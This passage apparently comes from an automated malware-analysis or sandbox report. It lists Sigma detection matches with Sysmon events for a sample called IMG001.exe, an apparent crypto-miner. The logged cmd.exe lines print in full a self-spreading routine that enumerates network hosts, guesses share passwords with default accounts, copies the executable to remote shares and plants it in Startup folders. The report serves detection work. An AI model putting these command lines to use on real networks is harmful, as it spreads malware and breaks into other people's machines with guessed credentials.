Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839555; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08A-6560-6C06-000000003B00}; ProcessId=7380; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C084-6560-4A06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7396; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=0201\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839562; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "7cb4a3985bd24a137550fa4c49b1da3fb949c3cf182a90950438e97aaad46378",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Share And Session Enumeration Using Net.EXE",
                                                                       "rule_description":  "Detects attempts to enumerate file shares, printer shares and sessions using \"net.exe\" with the \"view\" flag.",
                                                                       "rule_author":  "Endgame, JHasenbusch (ported for oscd.community)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07E-6560-3A06-000000003B00}; ProcessId=7820; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07E-6560-3906-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7816; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  view; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c @net view|find /i \"\\\\\" || @arp -a|find /i \"  1\"; UtcTime=1700839550; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C083-6560-4806-000000003B00}; ProcessId=7288; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C083-6560-4706-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8064; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  view; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c @net view|find /i \"\\\\\" || @arp -a|find /i \"  1\"; UtcTime=1700839555; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08A-6560-6F06-000000003B00}; ProcessId=8024; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C08A-6560-6E06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=3568; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  view; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c @net view|find /i \"\\\\\" || @arp -a|find /i \"  1\"; UtcTime=1700839562; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08D-6560-8506-000000003B00}; ProcessId=8144; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C08D-6560-8406-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6860; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  view; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=Medium; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c @net view|find /i \"\\\\\" || @arp -a|find /i \"  1\"; UtcTime=1700839565; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft\\xae Windows\\xae Operating System; CurrentDirectory=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\; OriginalFileName=net.exe; Hashes=MD5=31890A7DE89936F922D44D677F681A7F,SHA256=7C4C7725E266F12ABA8C50FD1598D4001201BCA0E7ACA901508307E365AFFF42,IMPHASH=AC592B83B5CAEB41A6F6DF7DB53F9076; Description=Net Command; FileVersion=10.0.19041.1 (WinBuild.160101.0800); ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c @net view|find /i \"\\\\\" || @arp -a|find /i \"  1\"; CommandLine=net  view; EventID=1; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\net.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "low",
                                                                       "rule_id":  "90412c9cf799f0ce454d95cf6bdbef8b1264fbcde3cd6b065ae6aee265882a86",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "System Network Connections Discovery Via Net.EXE",
                                                                       "rule_description":  "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.",
                                                                       "rule_author":  "frack113",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C088-6560-5E06-000000003B00}; ProcessId=7932; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07E-6560-3706-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7868; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  use * /delete /y  ; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1709\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839560; RuleName=-}"
                                                                                             },
